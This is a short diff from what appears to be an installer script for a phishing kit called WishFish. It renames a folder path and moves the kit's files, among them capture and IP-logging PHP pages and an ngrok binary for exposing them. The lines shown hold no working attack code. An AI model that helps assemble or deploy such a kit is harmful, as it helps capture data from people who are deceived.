@@ -329,7 +329,7 @@ input (Y + "Pleace Enter to OpEn...")
 
 system('cp $PREFIX/bin/ngrok ~/Dark.soul/WishFish')
 
-system('mv ~/Mr.Ali/WishFish ~')
+system('mv ~/Dark.soul/WishFish ~')
 
 system('mv ~/WishFish/Custom.html ~/WishFish/LICENSE ~/WishFish/README.md ~/WishFish/captured ~/WishFish/copy.sh ~/WishFish/index.php ~/WishFish/index2.html ~/WishFish/ip.php ~/WishFish/post.php ~/WishFish/ngrok ~/WishFish/template.php ~/WishFish/wishfish.html ~/WishFish/wishfish.sh ~/Dark.soul/')
 
